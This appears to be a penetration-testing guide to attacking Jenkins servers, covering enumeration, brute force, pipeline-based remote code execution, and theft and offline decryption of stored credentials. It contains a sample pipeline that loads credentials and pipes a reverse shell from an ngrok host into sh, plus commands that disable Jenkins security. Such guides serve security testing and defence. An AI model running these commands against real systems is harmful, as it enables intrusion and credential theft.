## Basic Information

Jenkins is a tool that offers a straightforward method for establishing a **continuous integration** or **continuous delivery** (CI/CD) environment for almost **any** combination of **programming languages** and source code repositories using pipelines. Furthermore, it automates various routine development tasks. While Jenkins doesn't eliminate the **need to create scripts for individual steps**, it does provide a faster and more robust way to integrate the entire sequence of build, test, and deployment tools than one can easily construct manually.

[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

In order to search for interesting Jenkins pages without authentication like (_/people_ or _/asynchPeople_, this lists the current users) you can use:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Check if you can execute commands without needing authentication:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Without credentials you can look inside _**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **usernames**.

You may be able to get the Jenkins version from the path _**/oops**_ or _**/error**_

### Known Vulnerabilities

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Login

In the basic information you can check **all the ways to login inside Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Register

You will be able to find Jenkins instances that **allow you to create an account and login inside of it. As simple as that.**

### **SSO Login**

Also if **SSO** **functionality**/**plugins** were present then you should attempt to **log-in** to the application using a test account (i.e., a test **Github/Bitbucket account**). Trick from [**here**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** lacks **password policy** and **username brute-force mitigation**. It's essential to **brute-force** users since **weak passwords** or **usernames as passwords** may be in use, even **reversed usernames as passwords**.

```
msf> use auxiliary/scanner/http/jenkins_login
```

### Password spraying

Use [this python script](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Many organizations combine **SaaS-based source control management (SCM) systems** such as GitHub or GitLab with an **internal, self-hosted CI** solution like Jenkins or TeamCity. This setup allows CI systems to **receive webhook events from SaaS source control vendors**, primarily for triggering pipeline jobs.

To achieve this, organizations **whitelist** the **IP ranges** of the **SCM platforms**, permitting them to access the **internal CI system** via **webhooks**. However, it's important to note that **anyone** can create an **account** on GitHub or GitLab and configure it to **trigger a webhook**, potentially sending requests to the **internal CI system**.

Check: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## Internal Jenkins Abuses

In these scenarios we are going to suppose you have a valid account to access Jenkins.

{% hint style="warning" %}
Depending on the **Authorization** mechanism configured in Jenkins and the permission of the compromised user you **might be able or not to perform the following attacks.**
{% endhint %}

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

If you have accessed Jenkins you can list other registered users in [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Use [this script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.

```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```

### **Stealing SSH Credentials**

If the compromised user has **enough privileges to create/modify a new Jenkins node** and SSH credentials are already stored to access other nodes, he could **steal those credentials** by creating/modifying a node and **setting a host that will record the credentials** without verifying the host key:

![](<../../.gitbook/assets/image (218).png>)

You will usually find Jenkins ssh credentials in a **global provider** (`/credentials/`), so you can also dump them as you would dump any other secret. More information in the [**Dumping secrets section**](./#dumping-secrets).

### **RCE in Jenkins**

Getting a **shell in the Jenkins server** gives the attacker the opportunity to leak all the **secrets** and **env variables** and to **exploit other machines** located in the same network or even **gather cloud credentials**.

By default, Jenkins will **run as SYSTEM**. So, compromising it will give the attacker **SYSTEM privileges**.

### **RCE Creating/Modifying a project**

Creating/Modifying a project is a way to obtain RCE over the Jenkins server:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Execute Groovy script**

You can also obtain RCE executing a Groovy script, which might my stealthier than creating a new project:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creating/Modifying Pipeline

You can also get **RCE by creating/modifying a pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline Exploitation

To exploit pipelines you still need to have access to Jenkins.

### Build Pipelines

**Pipelines** can also be used as **build mechanism in projects**, in that case it can be configured a **file inside the repository** that will contains the pipeline syntax. By default `/Jenkinsfile` is used:

![](<../../.gitbook/assets/image (127).png>)

It's also possible to **store pipeline configuration files in other places** (in other repositories for example) with the goal of **separating** the repository **access** and the pipeline access.

If an attacker have **write access over that file** he will be able to **modify** it and **potentially trigger** the pipeline without even having access to Jenkins.\
It's possible that the attacker will need to **bypass some branch protections** (depending on the platform and the user privileges they could be bypassed or not).

The most common triggers to execute a custom pipeline are:

* **Pull request** to the main branch (or potentially to other branches)
* **Push to the main branch** (or potentially to other branches)
* **Update the main branch** and wait until it's executed somehow

{% hint style="info" %}
If you are an **external user** you shouldn't expect to create a **PR to the main branch** of the repo of **other user/organization** and **trigger the pipeline**... but if it's **bad configured** you could fully **compromise companies just by exploiting this**.
{% endhint %}

### Pipeline RCE

In the previous RCE section it was already indicated a technique to [**get RCE modifying a pipeline**](./#rce-creating-modifying-pipeline).

### Checking Env variables

It's possible to declare **clear text env variables** for the whole pipeline or for specific stages. This env variables **shouldn't contain sensitive info**, but and attacker could always **check all the pipeline** configurations/Jenkinsfiles:

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
```

### Dumping secrets

For information about how are secrets usually treated by Jenkins check out the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Credentials can be **scoped to global providers** (`/credentials/`) or to **specific projects** (`/job/<project-name>/configure`). Therefore, in order to exfiltrate all of them you need to **compromise at least all the projects** that contains secrets and execute custom/poisoned pipelines.

There is another problem, in order to get a **secret inside the env** of a pipeline you need to **know the name and type of the secret**. For example, you try lo **load** a **`usernamePassword`** **secret** as a **`string`** **secret** you will get this **error**:

```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```

Here you have the way to load some common secret types:

```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Search for USERNAME and PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Search for SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Search for USERPASS
    '''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

At the end of this page you can **find all the credential types**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
The best way to **dump all the secrets at once** is by **compromising** the **Jenkins** machine (running a reverse shell in the **built-in node** for example) and then **leaking** the **master keys** and the **encrypted secrets** and decrypting them offline.\
More on how to do this in the [Nodes & Agents section](./#nodes-and-agents) and in the [Post Exploitation section](./#post-exploitation).
{% endhint %}

### Triggers

From [the docs](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): The `triggers` directive defines the **automated ways in which the Pipeline should be re-triggered**. For Pipelines which are integrated with a source such as GitHub or BitBucket, `triggers` may not be necessary as webhooks-based integration will likely already be present. The triggers currently available are `cron`, `pollSCM` and `upstream`.

Cron example:

```bash
triggers { cron('H */4 * * 1-5') }
```

Check **other examples in the docs**.

### Nodes & Agents

A **Jenkins instance** might have **different agents running in different machines**. From an attacker perspective, access to different machines means **different potential cloud credentials** to steal or **different network access** that could be abuse to exploit other machines.

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

You can enumerate the **configured nodes** in `/computer/`, you will usually find the \*\*`Built-In Node` \*\* (which is the node running Jenkins) and potentially more:

![](<../../.gitbook/assets/image (249).png>)

It is **specially interesting to compromise the Built-In node** because it contains sensitive Jenkins information.

To indicate you want to **run** the **pipeline** in the **built-in Jenkins node** you can specify inside the pipeline the following config:

```bash
pipeline {
    agent {label 'built-in'}
```

### Complete example

Pipeline in an specific agent, with a cron trigger, with pipeline and stage env variables, loading 2 variables in a step and sending a reverse shell:

```bash
pipeline {
    agent {label 'built-in'}
    triggers { cron('H */4 * * 1-5') }
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
            withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                     string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
                sh '''
                    curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
                '''
            }
        }
    }

    post { 
        always { 
            cleanWs()
        }
    }
}
```

## Post Exploitation

### Metasploit

```
msf> post/multi/gather/jenkins_gather
```

### Jenkins Secrets

You can list the secrets accessing `/credentials/` if you have enough permissions. Note that this will only list the secrets inside the `credentials.xml` file, but **build configuration files** might also have **more credentials**.

If you can **see the configuration of each project**, you can also see in there the **names of the credentials (secrets)** being use to access the repository and **other credentials of the project**.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

These files are needed to **decrypt Jenkins secrets**:

* secrets/master.key
* secrets/hudson.util.Secret

Such **secrets can usually be found in**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Here's a regex to find them:

```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```

#### Decrypt Jenkins secrets offline

If you have dumped the **needed passwords to decrypt the secrets**, use [**this script**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **to decrypt those secrets**.

```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----

NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```

#### Decrypt Jenkins secrets from Groovy

```bash
println(hudson.util.Secret.decrypt("{...}"))
```

### Create new admin user

1. Access the Jenkins config.xml file in `/var/lib/jenkins/config.xml` or `C:\Program Files (x86)\Jenkis\`
2. Search for the word `<useSecurity>true</useSecurity>`and change the word \*\*`true` \*\* to **`false`**.
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restart** the **Jenkins** server: `service jenkins restart`
4. Now go to the Jenkins portal again and **Jenkins will not ask any credentials** this time. You navigate to "**Manage Jenkins**" to set the **administrator password again**.
5. **Enable** the **security** again by changing settings to `<useSecurity>true</useSecurity>` and **restart the Jenkins again**.
